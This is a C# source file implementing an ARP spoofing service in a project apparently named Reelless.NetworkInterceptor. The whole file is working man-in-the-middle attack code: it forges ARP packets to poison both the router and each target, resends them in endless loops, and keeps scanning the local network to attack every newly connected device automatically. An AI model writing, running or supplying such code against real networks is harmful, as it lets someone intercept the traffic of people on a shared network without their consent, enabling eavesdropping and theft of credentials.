using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using Reelless.NetworkInterceptor.Global;
using Reelless.NetworkInterceptor.Interfaces;
using SharpPcap;

namespace Reelless.NetworkInterceptor.Services
{
    public class SpoofingService : ISpoofingService
    {
        private Dictionary<IPAddress, PhysicalAddress> _engagedClientList = new Dictionary<IPAddress, PhysicalAddress>();
        private int _timeout = 500;
        private readonly ILanClientsService _lanClientsService;

        public SpoofingService(ILanClientsService lanClientsService)
        {
            _lanClientsService = lanClientsService;
        }

        ///<summary>
        /// Initiates spoofing attack on a target list, creating a thread for each target
        ///</summary>
        /// <param name="targetList"> Targets to become their MITM (Man In The Middle)</param>
        /// <param name="gatewayIpAddress"> Ip address of the router</param>
        /// <param name="gatewayMacAddress"> Mac address of the router</param>
        public void StartSpoof(Dictionary<IPAddress, PhysicalAddress> targetList, IPAddress gatewayIpAddress, PhysicalAddress gatewayMacAddress)
        {
            _engagedClientList = new Dictionary<IPAddress, PhysicalAddress>();
            Constants.captureDevice.Open();
            foreach (var target in targetList)
            {
                InitiateAttackOnTarget(target, gatewayIpAddress, gatewayMacAddress);
            };
             new Thread(() =>
            {
                ScanNetworkAndSpoofNewTargets(gatewayIpAddress, gatewayMacAddress); 
            }).Start();           
        }

        /// <summary>
        /// starts a thread for a given target to attack it.
        /// </summary>
        /// <param name="target"></param>
        /// <param name="gatewayIpAddress"></param>
        /// <param name="gatewayMacAddress"></param>
        private void InitiateAttackOnTarget(KeyValuePair<IPAddress, PhysicalAddress> target, IPAddress gatewayIpAddress, PhysicalAddress gatewayMacAddress)
        {
            if(target.Key.Equals(gatewayIpAddress))
                    return;
                    
            ArpPacket arpPacketForGatewayRequest = new ArpPacket(ArpOperation.Request, gatewayMacAddress, gatewayIpAddress, Constants.myMacAddress, target.Key);
            ArpPacket arpPacketForTargetResponse = new ArpPacket(ArpOperation.Response, target.Value, target.Key, Constants.myMacAddress, gatewayIpAddress);
            EthernetPacket ethernetPacketForGatewayRequest = new EthernetPacket(Constants.myMacAddress, gatewayMacAddress, EthernetType.Arp);
            ethernetPacketForGatewayRequest.PayloadPacket = arpPacketForGatewayRequest;
            EthernetPacket ethernetPacketForTargetResponse = new EthernetPacket(Constants.myMacAddress, target.Value, EthernetType.Arp);
            ethernetPacketForTargetResponse.PayloadPacket = arpPacketForTargetResponse;
            new Thread(() =>
            {
                SpoofTarget(ethernetPacketForGatewayRequest, ethernetPacketForTargetResponse, target);
            }).Start();
            _engagedClientList.Add(target.Key, target.Value);
        }

        /// <summary>
        /// Scans for new connected devices in the background and spoofs them.
        /// </summary>
        private void ScanNetworkAndSpoofNewTargets(IPAddress gatewayIpAddress, PhysicalAddress gatewayMacAddress)
        {
            while(true)
            {
                this._lanClientsService.CaptureLanClientsSilent();
                Console.WriteLine("Clients list refreshed");
                var newLanClientsList = this._lanClientsService.GetLanClientsList();

                foreach (var client in newLanClientsList)
                {
                    if(!client.Value.Equals(gatewayMacAddress) && !_engagedClientList.Keys.Select(k => k.ToString()).Contains(client.Key.ToString()))
                    {
                        Console.WriteLine($"New target found: {client.Key} | {client.Value}");
                        InitiateAttackOnTarget(target: client, gatewayIpAddress, gatewayMacAddress);
                    }
                }
            }
        }

        /// <summary>
        /// Continuously spams both the target and the router with arp packets.
        /// </summary>
        private void SpoofTarget(EthernetPacket ethernetPacketForGatewayRequest, EthernetPacket ethernetPacketForTargetResponse, KeyValuePair<IPAddress, PhysicalAddress> target)
        {
            Console.WriteLine("Spoofing target " + target.Value.ToString() + " @ " + target.Key.ToString());
            try
            {
                while (true)
                {
                    Constants.captureDevice.SendPacket(ethernetPacketForGatewayRequest);
                    Constants.captureDevice.SendPacket(ethernetPacketForTargetResponse);
                    Thread.Sleep(_timeout);
                }
            }
            catch (PcapException ex)
            {
                Console.WriteLine("Could not initiate attack [" + ex.Message + "]");
            }
        }
    }
}